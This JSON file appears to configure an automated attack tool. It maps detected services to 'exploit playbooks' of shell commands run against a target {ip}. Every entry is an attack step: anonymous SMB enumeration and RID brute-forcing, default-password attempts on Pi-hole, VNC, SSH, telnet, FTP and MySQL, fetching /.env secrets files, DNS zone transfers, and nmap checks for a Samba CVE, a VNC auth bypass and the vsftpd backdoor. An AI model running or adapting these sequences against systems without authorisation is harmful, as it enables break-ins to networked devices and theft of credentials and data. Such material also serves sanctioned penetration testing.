{
  "_meta": {
    "description": "Exploit playbooks — multi-step attack sequences",
    "repeatable": "false = one-and-done (enumeration/recon), true = can retry (cred attacks)"
  },
  "playbooks": [
    {
      "id": "smb_share_read",
      "trigger_obs": "shares accessible",
      "trigger_ports": [445, 139],
      "repeatable": false,
      "desc": "Read contents of accessible SMB shares",
      "steps": [
        "smbclient -N //{ip}/{share} -c 'recurse ON; ls'",
        "impacket-samrdump {ip}",
        "nxc smb {ip} -u '' -p '' --rid-brute"
      ]
    },
    {
      "id": "pihole_exploit",
      "trigger_obs": "Pi-hole",
      "trigger_ports": [80, 443],
      "repeatable": false,
      "desc": "Exploit Pi-hole web interface",
      "steps": [
        "curl -s -X POST http://{ip}/admin/index.php -d 'pw=admin'",
        "curl -s -X POST http://{ip}/admin/index.php -d 'pw=raspberry'",
        "curl -s http://{ip}/admin/api.php?status",
        "gobuster dir -u http://{ip}/admin -w /usr/share/wordlists/dirb/common.txt -q -t 5"
      ]
    },
    {
      "id": "dns_zone_transfer",
      "trigger_obs": "DNS resolver",
      "trigger_ports": [53],
      "repeatable": false,
      "desc": "Attempt DNS zone transfer and enumerate",
      "steps": [
        "dig axfr @{ip}",
        "dig @{ip} any",
        "dig @{ip} -x 192.168.1.1"
      ]
    },
    {
      "id": "samba_deep",
      "trigger_obs": "Samba version",
      "trigger_ports": [445],
      "repeatable": false,
      "desc": "Deep Samba enumeration after version detection",
      "steps": [
        "impacket-samrdump {ip}",
        "impacket-rpcdump {ip}",
        "nmap -T2 --script=smb-vuln-cve-2017-7494 -p 445 {ip}"
      ]
    },
    {
      "id": "http_deep",
      "trigger_obs": "HTTP server",
      "trigger_ports": [80, 8080, 8888, 443],
      "repeatable": false,
      "desc": "Deep HTTP enumeration",
      "steps": [
        "curl -s http://{ip}/robots.txt",
        "curl -s http://{ip}/.env",
        "nikto -h http://{ip} -Tuning 1 -maxtime 60s",
        "gobuster dir -u http://{ip} -w /usr/share/wordlists/dirb/common.txt -q -t 5"
      ]
    },
    {
      "id": "vnc_attack",
      "trigger_obs": "VNC",
      "trigger_ports": [5900, 5901],
      "repeatable": true,
      "desc": "VNC password brute force",
      "steps": [
        "nxc vnc {ip} -p password",
        "nxc vnc {ip} -p raspberry",
        "nxc vnc {ip} -p admin",
        "nmap -T2 --script=vnc-info,realvnc-auth-bypass -p 5900 {ip}"
      ]
    },
    {
      "id": "ssh_full_attack",
      "trigger_obs": "SSH:",
      "trigger_ports": [22],
      "repeatable": false,
      "desc": "Full SSH credential attack",
      "steps": [
        "nxc ssh {ip} -u pi -p raspberry",
        "nxc ssh {ip} -u root -p root",
        "nxc ssh {ip} -u admin -p admin",
        "nmap -T2 --script=ssh-auth-methods -p 22 {ip}"
      ]
    },
    {
      "id": "telnet_attack",
      "trigger_obs": "telnet",
      "trigger_ports": [23],
      "repeatable": true,
      "desc": "Telnet default credentials",
      "steps": [
        "nxc telnet {ip} -u admin -p admin",
        "nxc telnet {ip} -u root -p root",
        "nxc telnet {ip} -u admin -p password"
      ]
    },
    {
      "id": "ftp_attack",
      "trigger_obs": "ftp",
      "trigger_ports": [21],
      "repeatable": true,
      "desc": "FTP anonymous + default creds",
      "steps": [
        "nxc ftp {ip} -u anonymous -p anonymous",
        "nmap -T2 --script=ftp-anon,ftp-vsftpd-backdoor -p 21 {ip}"
      ]
    },
    {
      "id": "redis_attack",
      "trigger_obs": "redis",
      "trigger_ports": [6379],
      "repeatable": false,
      "desc": "Redis unauthenticated access",
      "steps": [
        "redis-cli -h {ip} INFO",
        "redis-cli -h {ip} CONFIG GET dir"
      ]
    },
    {
      "id": "mysql_attack",
      "trigger_obs": "mysql",
      "trigger_ports": [3306],
      "repeatable": true,
      "desc": "MySQL default creds",
      "steps": [
        "nxc mysql {ip} -u root -p root",
        "nxc mysql {ip} -u root -p ''"
      ]
    }
  ]
}
